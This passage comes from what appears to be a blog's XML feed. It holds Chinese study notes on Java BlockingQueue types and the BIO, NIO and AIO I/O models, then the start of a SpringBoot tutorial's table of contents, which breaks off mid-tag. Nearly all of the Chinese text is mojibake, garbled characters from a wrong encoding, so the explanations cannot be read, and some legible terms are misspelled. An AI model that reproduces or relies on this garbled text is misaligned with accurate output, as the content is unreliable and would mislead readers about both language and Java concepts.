ä¸ºæ­¢å¯¹åº”put</p><p>Pollå¯¹åº”offerï¼Œæ˜¯ä»é˜Ÿåˆ—å¤´éƒ¨å–å‡ºå…ƒç´ ï¼Œå¦‚æœé˜Ÿåˆ—ä¸ºç©ºæœ€å¤šç­‰å¾…timeoutæŒ‡å®šæ—¶é—´ï¼Œä¸­æ–­æŠ›å‡ºInterruptedException </p><p>remainingCapacity()è·å–å½“å‰é˜Ÿåˆ—å‰©ä½™å¯å­˜å‚¨å…ƒç´ æ•°é‡ </p><p>remove ä»é˜Ÿåˆ—ç§»é™¤æŒ‡å®šå¯¹è±¡ </p><p>containsåˆ¤æ–­é˜Ÿåˆ—ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šå¯¹è±¡ </p><p>drainToè½¬ç§»åˆ°æŒ‡å®šé›†åˆã€‚</p><h4><span id="blockingqueueç±»å‹">BlockingQueueç±»å‹</span></h4><p><strong>1.</strong>   <font color="orange"><strong>ArrayBlockingQueueï¼šä¸€ä¸ªç”±æ•°ç»„ç»“æ„ç»„æˆçš„æœ‰ç•Œé˜»å¡é˜Ÿåˆ—ï¼›</strong></font></p><p><strong>2.</strong>    <font color="orange"><strong>LinkedBlockingQueueï¼šä¸€ä¸ªç”±é“¾è¡¨ç»“æ„ç»„æˆçš„æœ‰ç•Œ&#x2F;æ— ç•Œé˜»å¡é˜Ÿåˆ—ï¼›</strong></font></p><p><strong>3.</strong>   <font color="orange"> <strong>PriorityBlockingQueueï¼šä¸€ä¸ªæ”¯æŒä¼˜å…ˆçº§æ’åºçš„æ— ç•Œé˜»å¡é˜Ÿåˆ—</strong></font></p><p><strong>4.</strong>   <strong>DealyQueueï¼šä¸€ä¸ªä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—å®ç°çš„æ— ç•Œé˜»å¡é˜Ÿåˆ—ï¼›</strong></p><p><strong>5.</strong>   <strong>SynchronousQueueï¼šä¸€ä¸ªä¸å­˜å‚¨å…ƒç´ çš„é˜»å¡é˜Ÿåˆ—ï¼›</strong></p><p><strong>6.</strong>   <strong>LinkedTransferQueueï¼šä¸€ä¸ªç”±é“¾è¡¨ç»“æ„ç»„æˆçš„æ— ç•Œé˜»å¡é˜Ÿåˆ—ï¼›</strong></p><p><strong>7.</strong>   <strong>LinkedBlockingDequeï¼šä¸€ä¸ªç”±é“¾è¡¨ç»“æ„ç»„æˆçš„åŒå‘é˜»å¡é˜Ÿåˆ—ï¼›</strong></p><p><strong>å…¨éƒ½æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</strong></p><p>1æ˜¯FIFO</p><p>2æ— ç•ŒæŒ‡çš„æ˜¯Integer.MAX_VALUE  FIFO</p><p>3.å¸¦ä¼˜å…ˆçº§çš„é˜Ÿåˆ—ä¸æ˜¯FIFO</p><h2><span id="åŒæ­¥ä¸å¼‚æ­¥">åŒæ­¥ä¸å¼‚æ­¥</span></h2><ul><li><strong>åŒæ­¥ï¼š</strong> åŒæ­¥å°±æ˜¯å‘èµ·ä¸€ä¸ªè°ƒç”¨åï¼Œè¢«è°ƒç”¨è€…æœªå¤„ç†å®Œè¯·æ±‚ä¹‹å‰ï¼Œè°ƒç”¨ä¸è¿”å›ã€‚</li><li><strong>å¼‚æ­¥ï¼š</strong> å¼‚æ­¥å°±æ˜¯å‘èµ·ä¸€ä¸ªè°ƒç”¨åï¼Œç«‹åˆ»å¾—åˆ°è¢«è°ƒç”¨è€…çš„å›åº”è¡¨ç¤ºå·²æ¥æ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯è¢«è°ƒç”¨è€…å¹¶æ²¡æœ‰è¿”å›ç»“æœï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å¤„ç†å…¶ä»–çš„è¯·æ±‚ï¼Œè¢«è°ƒç”¨è€…é€šå¸¸ä¾é äº‹ä»¶ï¼Œå›è°ƒç­‰æœºåˆ¶æ¥é€šçŸ¥è°ƒç”¨è€…å…¶è¿”å›ç»“æœã€‚</li></ul><h2><span id="é˜»å¡å’Œéé˜»å¡">é˜»å¡å’Œéé˜»å¡</span></h2><ul><li><strong>é˜»å¡ï¼š</strong> é˜»å¡å°±æ˜¯å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œè°ƒç”¨è€…ä¸€ç›´ç­‰å¾…è¯·æ±‚ç»“æœè¿”å›ï¼Œä¹Ÿå°±æ˜¯å½“å‰çº¿ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œæ— æ³•ä»äº‹å…¶ä»–ä»»åŠ¡ï¼Œåªæœ‰å½“æ¡ä»¶å°±ç»ªæ‰èƒ½ç»§ç»­ã€‚</li><li><strong>éé˜»å¡ï¼š</strong> éé˜»å¡å°±æ˜¯å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œè°ƒç”¨è€…ä¸ç”¨ä¸€ç›´ç­‰ç€ç»“æœè¿”å›ï¼Œå¯ä»¥å…ˆå»å¹²å…¶ä»–äº‹æƒ…ã€‚</li></ul><h2><span id="bio-åŒæ­¥é˜»å¡ix2foæ¨¡å¼">BIO (åŒæ­¥é˜»å¡I&#x2F;Oæ¨¡å¼)</span></h2><p><img src="/2020/03/31/Java-jar/image-20200403170310675.png"></p><p>æ•°æ®çš„è¯»å–å†™å…¥å¿…é¡»é˜»å¡åœ¨ä¸€ä¸ªçº¿ç¨‹å†…ç­‰å¾…å…¶å®Œæˆã€‚</p><h2><span id="nioåŒæ­¥éé˜»å¡">NIOï¼ˆåŒæ­¥éé˜»å¡ï¼‰</span></h2><p><img src="/2020/03/31/Java-jar/image-20200403170244673.png"></p><p>æ„å»ºå¤šè·¯å¤ç”¨çš„ã€åŒæ­¥éé˜»å¡çš„IOæ“ä½œ</p><h2><span id="aio-å¼‚æ­¥éé˜»å¡ix2foæ¨¡å‹">AIO ï¼ˆå¼‚æ­¥éé˜»å¡I&#x2F;Oæ¨¡å‹ï¼‰</span></h2><p>åŸºäºäº‹ä»¶å’Œå›è°ƒæœºåˆ¶çš„å¼‚æ­¥éé˜»å¡IO</p><p><img src="/2020/03/31/Java-jar/image-20200403170137243.png"></p><p>Ã˜ åŸºäºå›è°ƒï¼šå®ç°CompletionHandleræ¥å£ï¼Œè°ƒç”¨æ—¶è§¦å‘å›è°ƒå‡½æ•°</p><p>Ã˜ è¿”å›Futureï¼šé€šè¿‡isDone()æŸ¥çœ‹æ˜¯å¦å‡†å¤‡å¥½ï¼Œé€šè¿‡get()ç­‰å¾…è¿”å›æ•°æ®</p><p>ä»…ä»…Selecté˜¶æ®µæ˜¯é˜»å¡çš„ï¼Œå¯ä»¥é¿å…å¤§é‡å®¢æˆ·ç«¯è¿æ¥æ—¶é¢‘ç¹åˆ‡æ¢çº¿ç¨‹å¸¦æ¥çš„é—®é¢˜ã€‚</p><h2><span id="nio-å¦‚ä½•å®ç°å¤šè·¯å¤ç”¨åŠŸèƒ½">NIO å¦‚ä½•å®ç°å¤šè·¯å¤ç”¨åŠŸèƒ½</span></h2><p>Ã˜ Selectoré€‰æ‹©å™¨å¯ä»¥ç›‘å¬å¤šä¸ªChannelé€šé“</p><p>Ã˜ å®ç°ä¸€ä¸ªçº¿ç¨‹ç®¡ç†å¤šä¸ªChannelï¼ŒèŠ‚çœçº¿ç¨‹åˆ‡æ¢ä¸Šä¸‹æ–‡çš„èµ„æºæ¶ˆè€—ã€‚</p><p>Ã˜ Selectoråªèƒ½ç®¡ç†éé˜»å¡çš„é€šé“ï¼ŒFileChannelæ˜¯é˜»å¡çš„ï¼Œæ— æ³•ç®¡ç†ã€‚</p><h2><span id="aio-bio-nioçš„é€‚ç”¨åœºæ™¯">AIOã€BIOã€NIOçš„é€‚ç”¨åœºæ™¯</span></h2><p>Â·     BIOæ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®æ¯”è¾ƒå°ä¸”å›ºå®šçš„æ¶æ„ï¼Œè¿™ç§æ–¹å¼å¯¹æœåŠ¡å™¨èµ„æºè¦æ±‚æ¯”è¾ƒé«˜ï¼Œå¹¶å‘å±€é™äºåº”ç”¨ä¸­ï¼ŒJDK1.4ä»¥å‰çš„å”¯ä¸€é€‰æ‹©ã€‚</p><p>Â·     NIOæ–¹å¼é€‚ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒçŸ­ï¼ˆè½»æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚èŠå¤©æœåŠ¡å™¨ï¼Œå¹¶å‘å±€é™äºåº”ç”¨ä¸­ï¼Œç¼–ç¨‹æ¯”è¾ƒå¤æ‚ã€‚</p><p>Â·     AIOæ–¹å¼ä½¿ç”¨äºè¿æ¥æ•°ç›®å¤šä¸”è¿æ¥æ¯”è¾ƒé•¿ï¼ˆé‡æ“ä½œï¼‰çš„æ¶æ„ï¼Œæ¯”å¦‚ç›¸å†ŒæœåŠ¡å™¨ï¼Œå……åˆ†è°ƒç”¨OSå‚ä¸å¹¶å‘æ“ä½œï¼Œç¼–ç¨‹æ¯”è¾ƒå¤æ‚ï¼ŒJDK7å¼€å§‹æ”¯æŒã€‚ </p><table><thead><tr><th><strong>å±æ€§\æ¨¡å‹</strong></th><th><strong>é˜»å¡BIO</strong></th><th><strong>éé˜»å¡NIO</strong></th><th><strong>å¼‚æ­¥AIO</strong></th></tr></thead><tbody><tr><td><strong>Blocking</strong></td><td>é˜»å¡å¹¶åŒæ­¥</td><td>éé˜»å¡ä½†åŒæ­¥</td><td>éé˜»å¡å¹¶å¼‚æ­¥</td></tr><tr><td><strong>çº¿ç¨‹æ•°ï¼ˆserverï¼šclientï¼‰</strong></td><td>1:1</td><td>1:N</td><td>0:N</td></tr><tr><td><strong>å¤æ‚åº¦</strong></td><td>ç®€å•</td><td>è¾ƒå¤æ‚</td><td>å¤æ‚</td></tr><tr><td><strong>ååé‡</strong></td><td>ä½</td><td>é«˜</td><td>é«˜</td></tr></tbody></table><h2><span id="nioçš„æ ¸å¿ƒæ¦‚å¿µ">NIOçš„æ ¸å¿ƒæ¦‚å¿µ</span></h2><p><strong>1. ç¼“å†²åŒºBuffer</strong></p><p>Bufferæ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚å®ƒåŒ…å«ä¸€äº›è¦å†™å…¥æˆ–è€…è¯»å‡ºçš„æ•°æ®ã€‚</p><p>åœ¨NIOä¸­ï¼Œæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ç”¨ç¼“å†²åŒºå¤„ç†ã€‚è¿™ä¹Ÿå°±æœ¬æ–‡ä¸Šé¢è°ˆåˆ°çš„IOæ˜¯é¢å‘æµçš„ï¼ŒNIOæ˜¯é¢å‘ç¼“å†²åŒºçš„ã€‚</p><p>Â·     ByteBufferï¼šå­—èŠ‚ç¼“å†²åŒº</p><p>Â·     CharBuffer:å­—ç¬¦ç¼“å†²åŒº</p><p>Â·     ShortBufferï¼šçŸ­æ•´å‹ç¼“å†²åŒº</p><p>Â·     IntBufferï¼šæ•´å‹ç¼“å†²åŒº</p><p>Â·     LongBuffer:é•¿æ•´å‹ç¼“å†²åŒº</p><p>Â·     FloatBufferï¼šæµ®ç‚¹å‹ç¼“å†²åŒº</p><p>Â·     DoubleBufferï¼šåŒç²¾åº¦æµ®ç‚¹å‹ç¼“å†²åŒº</p><p><strong>2.é€šé“Channel</strong></p><p>Ã˜ Channelæ˜¯ä¸€ä¸ªé€šé“ï¼Œå¯ä»¥é€šè¿‡å®ƒè¯»å–å’Œå†™å…¥æ•°æ®ï¼Œ</p><p>Ã˜ é€šé“å’Œæµä¸åŒä¹‹å¤„åœ¨äºé€šé“æ˜¯åŒå‘çš„</p><p>Ã˜ Channelæ˜¯å…¨åŒå·¥çš„</p><p>Channelæœ‰å››ç§å®ç°ï¼š</p><p>Â·     FileChannel:æ˜¯ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚</p><p>Â·     DatagramChannel:ä»UDPç½‘ç»œä¸­è¯»å–æˆ–è€…å†™å…¥æ•°æ®ã€‚</p><p>Â·     SocketChannel:ä»TCPç½‘ç»œä¸­è¯»å–æˆ–è€…å†™å…¥æ•°æ®ã€‚</p><p>Â·     ServerSocketChannel:å…è®¸ä½ ç›‘å¬æ¥è‡ªTCPçš„è¿æ¥ï¼Œå°±åƒæœåŠ¡å™¨ä¸€æ ·ã€‚æ¯ä¸€ä¸ªè¿æ¥éƒ½ä¼šæœ‰ä¸€ä¸ªSocketChanneläº§ç”Ÿã€‚</p><p><strong>3.å¤šè·¯å¤ç”¨å™¨Selector</strong></p><p><img src="/2020/03/31/Java-jar/image-20200403165738902.png"></p><p>Ã˜ Selectoré€‰æ‹©å™¨å¯ä»¥ç›‘å¬å¤šä¸ªChannelé€šé“</p><p>Ã˜ å®ç°ä¸€ä¸ªçº¿ç¨‹ç®¡ç†å¤šä¸ªChannelï¼ŒèŠ‚çœçº¿ç¨‹åˆ‡æ¢ä¸Šä¸‹æ–‡çš„èµ„æºæ¶ˆè€—ã€‚</p><p>Ã˜ Selectoråªèƒ½ç®¡ç†éé˜»å¡çš„é€šé“ï¼ŒFileChannelæ˜¯é˜»å¡çš„ï¼Œæ— æ³•ç®¡ç†ã€‚</p><p><img src="/2020/03/31/Java-jar/image-20200403165814493.png"></p><p><img src="/2020/03/31/Java-jar/image-20200403165805117.png"></p><p><img src="/2020/03/31/Java-jar/image-20200403170112067.png"></p><p><img src="/2020/03/31/Java-jar/image-20200403170119045.png"></p><h3><span id="nioåº”ç”¨å’Œæ¡†æ¶ç­‰ç­‰">NIOåº”ç”¨å’Œæ¡†æ¶ç­‰ç­‰</span></h3><p>ä¾‹å¦‚ï¼šDubbo(æœåŠ¡æ¡†æ¶)ï¼Œå°±é»˜è®¤ä½¿ç”¨Nettyä½œä¸ºåŸºç¡€é€šä¿¡ç»„ä»¶ï¼Œç”¨äºå®ç°å„è¿›ç¨‹èŠ‚ç‚¹ä¹‹é—´çš„å†…éƒ¨é€šä¿¡ã€‚</p><p>Nettyæ˜¯ç›®å‰æœ€æµè¡Œçš„ä¸€ä¸ªJavaå¼€æºæ¡†æ¶NIOæ¡†æ¶ï¼ŒNettyæä¾›å¼‚æ­¥çš„ã€äº‹ä»¶é©±åŠ¨çš„ç½‘ç»œåº”ç”¨ç¨‹åºæ¡†æ¶å’Œå·¥å…·ï¼Œç”¨ä»¥å¿«é€Ÿå¼€å‘é«˜æ€§èƒ½ã€é«˜å¯é æ€§çš„ç½‘ç»œæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ç¨‹åºã€‚</p><p>ç›¸æ¯”JDKåŸç”ŸNIOï¼ŒNettyæä¾›äº†ç›¸å¯¹ååˆ†ç®€å•æ˜“ç”¨çš„APIï¼Œéå¸¸é€‚åˆç½‘ç»œç¼–ç¨‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå¸¸ç”¨ç±»åº“ä¸æŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot å…¥é—¨ç¬”è®°ã€è½¬ã€‘</title>
      <link href="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>SpringBoot å…¥é—¨ç¬”è®°</p><span id="more"></span><!-- toc --><ul><li><a href="#%E4%B8%80-spring-boot-%E5%85%A5%E9%97%A8"><strong>ä¸€ã€</strong>Spring Boot å…¥é—¨</a><ul><li><a href="#1-spring-boot-%E7%AE%80%E4%BB%8B">1ã€Spring Boot ç®€ä»‹</a></li><li><a href="#2-%E5%BE%AE%E6%9C%8D%E5%8A%A1">2ã€å¾®æœåŠ¡</a></li><li><a href="#3-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">3ã€ç¯å¢ƒå‡†å¤‡</a><ul><li><a href="#1-maven%E8%AE%BE%E7%BD%AE">1ã€MAVENè®¾ç½®ï¼›</a></li><li><a href="#2-idea%E8%AE%BE%E7%BD%AE">2ã€IDEAè®¾ç½®</a></li></ul></li><li><a href="#4-spring-boot-helloworld">4ã€Spring Boot HelloWorld</a><ul><li><a href="#1-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAmaven%E5%B7%A5%E7%A8%8Bjar">1ã€åˆ›å»ºä¸€ä¸ªmavenå·¥ç¨‹ï¼›ï¼ˆjarï¼‰</a></li><li><a href="#2-%E5%AF%BC%E5%85%A5spring-boot%E7%9B%B8%E5%85%B3%E7%9A%84%E4%BE%9D%E8%B5%96">2ã€å¯¼å…¥spring bootç›¸å…³çš„ä¾èµ–</a></li><li><a href="#3-%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E4%B8%BB%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8spring-boot%E5%BA%94%E7%94%A8">3ã€ç¼–å†™ä¸€ä¸ªä¸»ç¨‹åºï¼›å¯åŠ¨Spring Bootåº”ç”¨</a></li><li><a href="#4-%E7%BC%96%E5%86%99%E7%9B%B8%E5%85%B3%E7%9A%84controller-service">4ã€ç¼–å†™ç›¸å…³çš„Controllerã€Service</a></li><li><a href="#5-%E8%BF%90%E8%A1%8C%E4%B8%BB%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95">5ã€è¿è¡Œä¸»ç¨‹åºæµ‹è¯•</a></li><li><a href="#6-%E7%AE%80%E5%8C%96%E9%83%A8%E7%BD%B2">6ã€ç®€åŒ–éƒ¨ç½²</a></li></ul></li><li><a href="#5-hello-world%E6%8E%A2%E7%A9%B6">5ã€Hello Worldæ¢ç©¶</a><ul><li><a href="#1-pom%E6%96%87%E4%BB%B6">1ã€POMæ–‡ä»¶</a><ul><li><a href="#1-%E7%88%B6%E9%A1%B9%E7%9B%AE">1ã€çˆ¶é¡¹ç›®</a></li><li><a href="#2-%E5%90%AF%E5%8A%A8%E5%99%A8">2ã€å¯åŠ¨å™¨</a></li></ul></li><li><a href="#2-%E4%B8%BB%E7%A8%8B%E5%BA%8F%E7%B1%BB%E4%B8%BB%E5%85%A5%E5%8F%A3%E7%B1%BB">2ã€ä¸»ç¨‹åºç±»ï¼Œä¸»å…¥å£ç±»</a></li></ul></li><li><a href="#6-%E4%BD%BF%E7%94%A8spring-initializer%E5%BF%AB%E9%80%9F%E5%88%9B%E5%BB%BAspring-boot%E9%A1%B9%E7%9B%AE">6ã€ä½¿ç”¨Spring Initializerå¿«é€Ÿåˆ›å»ºSpring Booté¡¹ç›®</a><ul><li><a href="#1-idea%E4%BD%BF%E7%94%A8-spring-initializer%E5%BF%AB%E9%80%9F%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE">1ã€IDEAï¼šä½¿ç”¨ Spring Initializerå¿«é€Ÿåˆ›å»ºé¡¹ç›®</a></li><li><a href="#2-sts%E4%BD%BF%E7%94%A8-spring-starter-project%E5%BF%AB%E9%80%9F%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE">2ã€STSä½¿ç”¨ Spring Starter Projectå¿«é€Ÿåˆ›å»ºé¡¹ç›®</a></li></ul></li></ul></li><li><a href="#%E4%BA%8C-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">äºŒã€é…ç½®æ–‡ä»¶</a><ul><li><a href="#1-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">1ã€é…ç½®æ–‡ä»¶</a></li><li><a href="#2-yaml%E8%AF%AD%E6%B3%95">2ã€YAMLè¯­æ³•ï¼š</a><ul><li><a href="#1-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">1ã€åŸºæœ¬è¯­æ³•</a></li><li><a href="#2-%E5%80%BC%E7%9A%84%E5%86%99%E6%B3%95">2ã€å€¼çš„å†™æ³•</a><ul><li><a href="#%E5%AD%97%E9%9D%A2%E9%87%8F%E6%99%AE%E9%80%9A%E7%9A%84%E5%80%BC%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B8%83%E5%B0%94">å­—é¢é‡ï¼šæ™®é€šçš„å€¼ï¼ˆæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”ï¼‰</a></li><li><a href="#%E5%AF%B9%E8%B1%A1-map%E5%B1%9E%E6%80%A7%E5%92%8C%E5%80%BC%E9%94%AE%E5%80%BC%E5%AF%B9">å¯¹è±¡ã€Mapï¼ˆå±æ€§å’Œå€¼ï¼‰ï¼ˆé”®å€¼å¯¹ï¼‰ï¼š</a></li><li><a href="#%E6%95%B0%E7%BB%84list-set">æ•°ç»„ï¼ˆListã€Setï¼‰ï¼š</a></li></ul></li></ul></li><li><a href="#3-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%80%BC%E6%B3%A8%E5%85%A5">3ã€é…ç½®æ–‡ä»¶å€¼æ³¨å…¥</a><ul><li><a href="#1-properties%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%9C%A8idea%E4%B8%AD%E9%BB%98%E8%AE%A4utf-8%E5%8F%AF%E8%83%BD%E4%BC%9A%E4%B9%B1%E7%A0%81">1ã€propertiesé…ç½®æ–‡ä»¶åœ¨ideaä¸­é»˜è®¤utf-8å¯èƒ½ä¼šä¹±ç </a></li><li><a href="#2-value%E8%8E%B7%E5%8F%96%E5%80%BC%E5%92%8Cconfigurationproperties%E8%8E%B7%E5%8F%96%E5%80%BC%E6%AF%94%E8%BE%83">2ã€@Valueè·å–å€¼å’Œ@ConfigurationPropertiesè·å–å€¼æ¯”è¾ƒ</a></li><li><a href="#3-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5%E5%80%BC%E6%95%B0%E6%8D%AE%E6%A0%A1%E9%AA%8C">3ã€é…ç½®æ–‡ä»¶æ³¨å…¥å€¼æ•°æ®æ ¡éªŒ</a></li><li><a href="#4-propertysourceimportresourcebean">4ã€@PropertySource&amp;@ImportResource&amp;@Bean</a></li></ul><ul><li><a href="#1-%E9%9A%8F%E6%9C%BA%E6%95%B0">1ã€éšæœºæ•°</a></li><li><a href="#2-%E5%8D%A0%E4%BD%8D%E7%AC%A6%E8%8E%B7%E5%8F%96%E4%B9%8B%E5%89%8D%E9%85%8D%E7%BD%AE%E7%9A%84%E5%80%BC%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%8F%AF%E4%BB%A5%E6%98%AF%E7%94%A8%E6%8C%87%E5%AE%9A%E9%BB%98%E8%AE%A4%E5%80%BC">2ã€å ä½ç¬¦è·å–ä¹‹å‰é…ç½®çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰å¯ä»¥æ˜¯ç”¨:æŒ‡å®šé»˜è®¤å€¼</a></li></ul></li><li><a href="#5-profile">5ã€Profile</a><ul><li><a href="#1-%E5%A4%9Aprofile%E6%96%87%E4%BB%B6">1ã€å¤šProfileæ–‡ä»¶</a></li><li><a href="#2-yml%E6%94%AF%E6%8C%81%E5%A4%9A%E6%96%87%E6%A1%A3%E5%9D%97%E6%96%B9%E5%BC%8F">2ã€ymlæ”¯æŒå¤šæ–‡æ¡£å—æ–¹å¼</a></li><li><a href="#3-%E6%BF%80%E6%B4%BB%E6%8C%87%E5%AE%9Aprofile">3ã€æ¿€æ´»æŒ‡å®šprofile</a></li></ul></li><li><a href="#6-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E4%BD%8D%E7%BD%AE">6ã€é…ç½®æ–‡ä»¶åŠ è½½ä½ç½®</a></li><li><a href="#7-%E5%A4%96%E9%83%A8%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F">7ã€å¤–éƒ¨é…ç½®åŠ è½½é¡ºåº</a></li><li><a href="#8-%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86">8ã€è‡ªåŠ¨é…ç½®åŸç†</a><ul><li><a href="#1-%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86">1ã€<strong>è‡ªåŠ¨é…ç½®åŸç†ï¼š</strong></a></li><li><a href="#2-%E7%BB%86%E8%8A%82">2ã€ç»†èŠ‚</a><ul><li><a href="#1-conditional%E6%B4%BE%E7%94%9F%E6%B3%A8%E8%A7%A3spring%E6%B3%A8%E8%A7%A3%E7%89%88%E5%8E%9F%E7%94%9F%E7%9A%84conditional%E4%BD%9C%E7%94%A8">1ã€@Conditionalæ´¾ç”Ÿæ³¨è§£ï¼ˆSpringæ³¨è§£ç‰ˆåŸç”Ÿçš„@Conditionalä½œç”¨ï¼‰</a></li></ul></li></ul></li></ul></li><li><a href="#%E4%B8%89-%E6%97%A5%E5%BF%97">ä¸‰ã€æ—¥å¿—</a><ul><li><a href="#1-%E6%97%A5%E5%BF%97%E6%A1%86%E6%9E%B6">1ã€æ—¥å¿—æ¡†æ¶</a></li><li><a href="#2-slf4j%E4%BD%BF%E7%94%A8">2ã€SLF4jä½¿ç”¨</a><ul><li><a href="#1-%E5%A6%82%E4%BD%95%E5%9C%A8%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%BD%BF%E7%94%A8slf4j-httpswwwslf4jorg">1ã€å¦‚ä½•åœ¨ç³»ç»Ÿä¸­ä½¿ç”¨SLF4j https://www.slf4j.org</a></li><li><a href="#2-%E9%81%97%E7%95%99%E9%97%AE%E9%A2%98">2ã€é—ç•™é—®é¢˜</a></li></ul></li><li><a href="#3-springboot%E6%97%A5%E5%BF%97%E5%85%B3%E7%B3%BB">3ã€SpringBootæ—¥å¿—å…³ç³»</a></li><li><a href="#4-%E6%97%A5%E5%BF%97%E4%BD%BF%E7%94%A8">4ã€æ—¥å¿—ä½¿ç”¨ï¼›</a><ul><li><a href="#1-%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE">1ã€é»˜è®¤é…ç½®</a></li><li><a href="#2-%E6%8C%87%E5%AE%9A%E9%85%8D%E7%BD%AE">2ã€æŒ‡å®šé…ç½®</a></li></ul></li><li><a href="#5-%E5%88%87%E6%8D%A2%E6%97%A5%E5%BF%97%E6%A1%86%E6%9E%B6">5ã€åˆ‡æ¢æ—¥å¿—æ¡†æ¶</a></li></ul></li><li><a href="#%E5%9B%9B-web%E5%BC%80%E5%8F%91">å››ã€Webå¼€å‘</a><ul><li><a href="#1-%E7%AE%80%E4%BB%8B">1ã€ç®€ä»‹</a></li><li><a href="#2-springboot%E5%AF%B9%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E6%98%A0%E5%B0%84%E8%A7%84%E5%88%99">2ã€SpringBootå¯¹é™æ€èµ„æºçš„æ˜ å°„è§„åˆ™ï¼›</a></li><li><a href="#3-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E">3ã€æ¨¡æ¿å¼•æ“</a><ul><li><a href="#1-%E5%BC%95%E5%85%A5thymeleaf">1ã€å¼•å…¥thymeleafï¼›</a></li><li><a href="#2-thymeleaf%E4%BD%BF%E7%94%A8">2ã€Thymeleafä½¿ç”¨</a></li><li><a href="#3-%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99">3ã€è¯­æ³•è§„åˆ™</a></li></ul></li><li><a href="#4-springmvc%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE">4ã€SpringMVCè‡ªåŠ¨é…ç½®</a><ul><li><a href="#1-spring-mvc-auto-configuration">1. Spring MVC auto-configuration</a></li><li><a href="#2-%E6%89%A9%E5%B1%95springmvc">2ã€æ‰©å±•SpringMVC</a></li><li><a href="#3-%E5%85%A8%E9%9D%A2%E6%8E%A5%E7%AE%A1springmvc">3ã€å…¨é¢æ¥ç®¡SpringMVCï¼›</a></li></ul></li><li><a href="#5-%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9springboot%E7%9A%84%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE">5ã€å¦‚ä½•ä¿®æ”¹SpringBootçš„é»˜è®¤é…ç½®</a></li><li><a href="#6-restfulcrud">6ã€RestfulCRUD</a><ul><li><a href="#1-%E9%BB%98%E8%AE%A4%E8%AE%BF%E9%97%AE%E9%A6%96%E9%A1%B5">1ï¼‰ã€é»˜è®¤è®¿é—®é¦–é¡µ</a></li><li><a href="#2-%E5%9B%BD%E9%99%85%E5%8C%96">2ï¼‰ã€å›½é™…åŒ–</a></li><li><a href="#3-%E7%99%BB%E9%99%86">3ï¼‰ã€ç™»é™†</a></li><li><a href="#4-%E6%8B%A6%E6%88%AA%E5%99%A8%E8%BF%9B%E8%A1%8C%E7%99%BB%E9%99%86%E6%A3%80%E6%9F%A5">4ï¼‰ã€æ‹¦æˆªå™¨è¿›è¡Œç™»é™†æ£€æŸ¥</a></li><li><a href="#5-crud-%E5%91%98%E5%B7%A5%E5%88%97%E8%A1%A8">5ï¼‰ã€CRUD-å‘˜å·¥åˆ—è¡¨</a><ul><li><a href="#thymeleaf%E5%85%AC%E5%85%B1%E9%A1%B5%E9%9D%A2%E5%85%83%E7%B4%A0%E6%8A%BD%E5%8F%96">thymeleafå…¬å…±é¡µé¢å…ƒç´ æŠ½å–</a></li></ul></li><li><a href="#6-crud-%E5%91%98%E5%B7%A5%E6%B7%BB%E5%8A%A0">6ï¼‰ã€CRUD-å‘˜å·¥æ·»åŠ </a></li><li><a 